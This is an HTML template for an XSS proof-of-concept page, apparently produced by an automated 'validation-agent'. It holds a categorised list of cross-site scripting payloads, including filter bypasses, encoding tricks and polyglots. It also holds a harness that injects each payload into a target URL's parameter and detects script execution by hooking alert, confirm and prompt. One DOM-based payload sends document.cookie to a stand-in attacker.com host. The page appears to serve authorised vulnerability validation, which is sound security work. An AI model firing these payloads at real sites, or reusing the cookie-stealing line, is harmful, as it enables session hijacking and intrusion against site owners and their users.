<!DOCTYPE html>
<!--
XSS (Cross-Site Scripting) PoC
==============================
Target: {{TARGET_URL}}
Parameter: {{PARAMETER}}
Vuln ID: {{VULN_ID}}

Generated by: validation-agent
Generated at: {{GENERATED_AT}}

Usage:
    1. Open this file in a browser
    2. Click "Run Tests" button
    3. Check results panel for XSS indicators
-->
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS PoC - {{VULN_ID}}</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .header {
            background: #2c3e50;
            color: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .config {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .config input, .config select {
            width: 100%;
            padding: 10px;
            margin: 5px 0 15px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .btn {
            background: #3498db;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover { background: #2980b9; }
        .btn-danger { background: #e74c3c; }
        .btn-danger:hover { background: #c0392b; }
        .results {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .result-item {
            border: 1px solid #ddd;
            margin: 10px 0;
            padding: 15px;
            border-radius: 4px;
        }
        .result-item.success {
            border-color: #27ae60;
            background: #d5f5e3;
        }
        .result-item.failed {
            border-color: #e74c3c;
            background: #fadbd8;
        }
        .result-item.pending {
            border-color: #f39c12;
            background: #fef9e7;
        }
        .payload-code {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            overflow-x: auto;
            margin: 10px 0;
        }
        .evidence {
            background: #ecf0f1;
            padding: 10px;
            border-radius: 4px;
            margin-top: 10px;
        }
        #test-frame {
            width: 100%;
            height: 300px;
            border: 1px solid #ddd;
            margin-top: 20px;
        }
        .progress {
            height: 4px;
            background: #ecf0f1;
            border-radius: 2px;
            margin: 10px 0;
        }
        .progress-bar {
            height: 100%;
            background: #3498db;
            border-radius: 2px;
            transition: width 0.3s;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: left;
        }
        th { background: #f8f9fa; }
    </style>
</head>
<body>
    <div class="header">
        <h1>XSS Proof of Concept</h1>
        <p>Vuln ID: {{VULN_ID}}</p>
    </div>

    <div class="config">
        <h2>Configuration</h2>
        <label>Target URL:</label>
        <input type="text" id="target-url" value="{{TARGET_URL}}">

        <label>Parameter:</label>
        <input type="text" id="parameter" value="{{PARAMETER}}">

        <label>Parameter Location:</label>
        <select id="param-location">
            <option value="query" {{#if QUERY_SELECTED}}selected{{/if}}>Query String</option>
            <option value="hash" {{#if HASH_SELECTED}}selected{{/if}}>URL Fragment (Hash)</option>
            <option value="path" {{#if PATH_SELECTED}}selected{{/if}}>URL Path</option>
        </select>

        <label>XSS Type:</label>
        <select id="xss-type">
            <option value="reflected">Reflected XSS</option>
            <option value="dom">DOM-based XSS</option>
            <option value="stored">Stored XSS (manual verification)</option>
        </select>

        <button class="btn" onclick="runAllTests()">Run All Tests</button>
        <button class="btn btn-danger" onclick="clearResults()">Clear Results</button>
    </div>

    <div class="results">
        <h2>Test Results</h2>
        <div class="progress">
            <div class="progress-bar" id="progress-bar" style="width: 0%"></div>
        </div>
        <div id="results-container"></div>
    </div>

    <h3>Test Frame</h3>
    <iframe id="test-frame" sandbox="allow-scripts allow-same-origin"></iframe>

    <script>
        // XSS Payloads organized by category
        const payloads = {
            basic: [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'-alert('XSS')-'",
                '<iframe src="javascript:alert(\'XSS\')">',
            ],
            event_handlers: [
                '<div onmouseover="alert(\'XSS\')">hover me</div>',
                '<input onfocus=alert("XSS") autofocus>',
                '<marquee onstart=alert("XSS")>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
            ],
            encoding_bypass: [
                '&lt;script&gt;alert("XSS")&lt;/script&gt;',
                '%3Cscript%3Ealert("XSS")%3C/script%3E',
                '\\x3Cscript\\x3Ealert("XSS")\\x3C/script\\x3E',
                '\\u003Cscript\\u003Ealert("XSS")\\u003C/script\\u003E',
                '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
                '<SCRIPT>alert("XSS")</SCRIPT>',
                '<ScRiPt>alert("XSS")</ScRiPt>',
            ],
            filter_bypass: [
                '<img src=x onerror="alert`XSS`">',
                '<svg/onload=alert("XSS")>',
                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
                '"><img src=x onerror=alert(1)//',
                '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
                '<a href="javascript:alert(1)">click</a>',
                '<a href="data:text/html,<script>alert(1)</script>">click</a>',
            ],
            dom_based: [
                '"><script>document.location="http://attacker.com/?c="+document.cookie</script>',
                'javascript:alert(document.domain)',
                '#<script>alert("XSS")</script>',
                '<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>',
            ],
            polyglot: [
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
                '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23televenx29;>\'">',
            ]
        };

        // Track XSS triggers
        let xssTriggered = false;
        let xssEvidence = [];

        // Override alert, confirm, prompt to detect XSS
        const originalAlert = window.alert;
        const originalConfirm = window.confirm;
        const originalPrompt = window.prompt;

        window.alert = function(msg) {
            xssTriggered = true;
            xssEvidence.push({
                type: 'alert',
                message: msg,
                timestamp: new Date().toISOString()
            });
            console.log('[XSS Detected] Alert:', msg);
        };

        window.confirm = function(msg) {
            xssTriggered = true;
            xssEvidence.push({
                type: 'confirm',
                message: msg,
                timestamp: new Date().toISOString()
            });
            console.log('[XSS Detected] Confirm:', msg);
            return false;
        };

        window.prompt = function(msg) {
            xssTriggered = true;
            xssEvidence.push({
                type: 'prompt',
                message: msg,
                timestamp: new Date().toISOString()
            });
            console.log('[XSS Detected] Prompt:', msg);
            return null;
        };

        // Test results storage
        let testResults = [];

        function clearResults() {
            testResults = [];
            document.getElementById('results-container').innerHTML = '';
            document.getElementById('progress-bar').style.width = '0%';
        }

        function addResult(category, payload, success, evidence) {
            const result = {
                category,
                payload,
                success,
                evidence,
                timestamp: new Date().toISOString()
            };
            testResults.push(result);

            const container = document.getElementById('results-container');
            const statusClass = success ? 'success' : 'failed';

            const html = `
                <div class="result-item ${statusClass}">
                    <strong>${success ? '✅ VULNERABLE' : '❌ Not Vulnerable'}</strong>
                    <span style="float:right">${category}</span>
                    <div class="payload-code">${escapeHtml(payload)}</div>
                    ${evidence ? `<div class="evidence"><strong>Evidence:</strong> ${escapeHtml(evidence)}</div>` : ''}
                </div>
            `;
            container.innerHTML += html;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function buildUrl(payload) {
            const baseUrl = document.getElementById('target-url').value;
            const param = document.getElementById('parameter').value;
            const location = document.getElementById('param-location').value;

            let url = baseUrl;
            const encodedPayload = encodeURIComponent(payload);

            switch (location) {
                case 'query':
                    url += (url.includes('?') ? '&' : '?') + param + '=' + encodedPayload;
                    break;
                case 'hash':
                    url += '#' + param + '=' + encodedPayload;
                    break;
                case 'path':
                    url = url.replace('{' + param + '}', encodedPayload);
                    break;
            }

            return url;
        }

        async function testPayload(category, payload) {
            xssTriggered = false;
            xssEvidence = [];

            const url = buildUrl(payload);
            const iframe = document.getElementById('test-frame');

            return new Promise((resolve) => {
                // Set timeout for test
                const timeout = setTimeout(() => {
                    resolve({
                        success: xssTriggered,
                        evidence: xssEvidence.length > 0 ?
                            JSON.stringify(xssEvidence) :
                            'No XSS triggered'
                    });
                }, 2000);

                try {
                    iframe.src = url;

                    // Also check for DOM changes
                    setTimeout(() => {
                        try {
                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                            // Check if script tags were injected
                            const scripts = iframeDoc.querySelectorAll('script');
                            const imgs = iframeDoc.querySelectorAll('img[onerror]');
                            const svgs = iframeDoc.querySelectorAll('svg[onload]');

                            if (scripts.length > 0 || imgs.length > 0 || svgs.length > 0) {
                                xssTriggered = true;
                                xssEvidence.push({
                                    type: 'dom_injection',
                                    elements: {
                                        scripts: scripts.length,
                                        imgs_with_onerror: imgs.length,
                                        svgs_with_onload: svgs.length
                                    }
                                });
                            }
                        } catch (e) {
                            // Cross-origin restriction - expected
                        }
                    }, 1000);

                } catch (e) {
                    clearTimeout(timeout);
                    resolve({
                        success: false,
                        evidence: 'Error: ' + e.message
                    });
                }
            });
        }

        async function runAllTests() {
            clearResults();
            const progressBar = document.getElementById('progress-bar');

            let totalPayloads = 0;
            for (const category in payloads) {
                totalPayloads += payloads[category].length;
            }

            let tested = 0;

            for (const category in payloads) {
                for (const payload of payloads[category]) {
                    const result = await testPayload(category, payload);
                    addResult(category, payload, result.success, result.evidence);

                    tested++;
                    progressBar.style.width = (tested / totalPayloads * 100) + '%';

                    // Small delay between tests
                    await new Promise(r => setTimeout(r, 500));
                }
            }

            // Summary
            const vulnerableCount = testResults.filter(r => r.success).length;
            const summaryHtml = `
                <div class="result-item ${vulnerableCount > 0 ? 'success' : 'failed'}">
                    <h3>Summary</h3>
                    <table>
                        <tr><th>Total Tests</th><td>${testResults.length}</td></tr>
                        <tr><th>Vulnerable</th><td>${vulnerableCount}</td></tr>
                        <tr><th>Status</th><td>${vulnerableCount > 0 ? '⚠️ XSS VULNERABILITY CONFIRMED' : '✓ No XSS detected'}</td></tr>
                    </table>
                </div>
            `;
            document.getElementById('results-container').innerHTML =
                summaryHtml + document.getElementById('results-container').innerHTML;
        }

        // Export results
        function exportResults() {
            const data = {
                target: document.getElementById('target-url').value,
                parameter: document.getElementById('parameter').value,
                vuln_id: '{{VULN_ID}}',
                timestamp: new Date().toISOString(),
                results: testResults,
                summary: {
                    total: testResults.length,
                    vulnerable: testResults.filter(r => r.success).length
                }
            };
            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'xss_poc_results_{{VULN_ID}}.json';
            a.click();
        }
    </script>

    <div style="margin-top: 20px;">
        <button class="btn" onclick="exportResults()">Export Results (JSON)</button>
    </div>
</body>
</html>
